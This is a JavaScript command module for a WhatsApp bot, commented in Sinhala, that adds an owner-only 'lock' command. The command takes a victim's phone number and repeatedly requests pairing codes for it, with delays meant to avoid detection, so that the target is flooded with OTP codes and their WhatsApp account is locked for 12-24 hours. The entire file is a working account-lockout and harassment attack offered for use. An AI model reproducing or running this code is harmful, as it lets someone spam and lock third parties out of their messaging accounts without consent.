const { cmd } = require('../command');

cmd({
    pattern: "lock",
    desc: "Lock target WhatsApp for 12-24 hours",
    category: "owner",
    filename: __filename
},
async(conn, mek, m, { from, q, isOwner, reply }) => {
    // අයිතිකරු පමණක්දැයි පරීක්ෂා කිරීම
    if (!isOwner) return reply("DEXTER ට පමණි. 🚫");
    
    if (!q) return reply("අංකය ලබා දෙන්න. \nඋදා: .lock 947xxxxxxxx");

    let target = q.replace(/[^0-9]/g, '');
    
    reply(`🔒 ${target} අංකය Lock කිරීම ආරම්භ කළා... \nමෙය සාර්ථක වීමට විනාඩි කිහිපයක් ගත විය හැක.`);

    // වට්සැප් එකට එක දිගට වැරදි OTP රික්වෙස්ට් යවන ලූප් එක
    // සටහන: මෙය බොට්ගේ සර්වර් එකේ පවර් එක අනුව වෙනස් වේ.
    for (let i = 0; i < 50; i++) {
        try {
            // මෙතනදී අපි වට්සැප් එකට බොරු Pairing/Login රික්වෙස්ට් එකක් යවනවා
            await conn.requestPairingCode(target); 
            
            // පොඩි විරාමයක් (වට්සැප් එකට අහුවෙන්නේ නැති වෙන්න)
            await new Promise(resolve => setTimeout(resolve, 1500)); 
        } catch (e) {
            // වට්සැප් එකෙන් "Too many requests" කිව්වොත් එතනින් නවත්වනවා
            if (e.message.includes('429')) {
                return reply(`✅ සාර්ථකයි! ${target} දැන් පැය 12කට Lock වී ඇත.`);
            }
        }
    }

    reply(`✅ වැඩේ අවසන්. ${target} ගේ ෆෝන් එකට දැන් දිගටම OTP Codes එයි. අවසානයේ එය Lock වේවි.`);
});
